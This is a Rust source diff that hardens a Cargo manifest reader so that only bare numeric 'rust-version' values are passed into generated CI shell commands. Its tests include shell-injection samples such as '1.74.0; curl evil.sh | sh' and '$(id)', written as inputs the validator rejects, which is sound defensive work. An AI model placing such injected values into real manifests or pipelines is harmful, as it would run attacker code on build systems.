@@ -11,12 +11,29 @@ pub struct RustFacts {
     /// The root package exists and is not `publish = false`
     pub publishable: bool,
     pub package_name: Option<String>,
-    /// The `rust-version` of the root package, if declared
+    /// The `rust-version` of the root package, if declared and well-formed
     pub msrv: Option<String>,
     /// The root manifest declares at least one feature
     pub has_features: bool,
     /// The root package is a library crate ([lib] section or src/lib.rs)
     pub is_library: bool,
+}
+
+/// Is this a bare `major[.minor[.patch]]` version, the only shape cargo
+/// accepts for `rust-version`?
+///
+/// The rust-msrv rule bakes this fact into `rustup toolchain install {msrv}`
+/// and `cargo +{msrv} check`, so a manifest from a repository we did not write
+/// gets to put text in a generated `run:` step. Anything but digits and dots
+/// is either a version no toolchain could resolve or shell being smuggled in,
+/// and in both cases the fact is better off absent — the rule falls back to
+/// reading the version in shell, where it stays quoted.
+fn is_toolchain_version(version: &str) -> bool {
+    let components: Vec<&str> = version.split('.').collect();
+    components.len() <= 3
+        && components
+            .iter()
+            .all(|c| !c.is_empty() && c.bytes().all(|b| b.is_ascii_digit()))
 }
 
 pub(super) fn gather(path: &Path) -> Option<RustFacts> {
@@ -34,6 +51,7 @@ pub(super) fn gather(path: &Path) -> Option<RustFacts> {
     let msrv = package
         .and_then(|p| p.rust_version.as_ref())
         .and_then(|v| v.get().ok())
+        .filter(|v| is_toolchain_version(v))
         .cloned();
 
     Some(RustFacts {
@@ -92,6 +110,36 @@ mod tests {
 
         let facts = facts_for("[package]\nname = \"lib\"\nversion = \"0.1.0\"\n").unwrap();
         assert_eq!(facts.msrv, None);
+
+        // Two components are as valid as three
+        let facts =
+            facts_for("[package]\nname = \"lib\"\nversion = \"0.1.0\"\nrust-version = \"1.74\"\n")
+                .unwrap();
+        assert_eq!(facts.msrv.as_deref(), Some("1.74"));
+    }
+
+    #[test]
+    fn test_malformed_rust_version_is_absent() {
+        // The rule interpolates this fact into a shell command, so anything
+        // that isn't a bare version must not become a fact — the rest of the
+        // manifest is still read
+        for rust_version in [
+            "1.74.0; curl evil.sh | sh",
+            "1.74.0 --profile minimal",
+            "$(id)",
+            ">=1.74",
+            "1.74.0-nightly",
+            "stable",
+            "1.2.3.4",
+            "",
+        ] {
+            let facts = facts_for(&format!(
+                "[package]\nname = \"lib\"\nversion = \"0.1.0\"\nrust-version = \"{rust_version}\"\n"
+            ))
+            .unwrap();
+            assert_eq!(facts.msrv, None, "rust-version {rust_version:?}");
+            assert_eq!(facts.package_name.as_deref(), Some("lib"));
+        }
     }
 
     #[test]
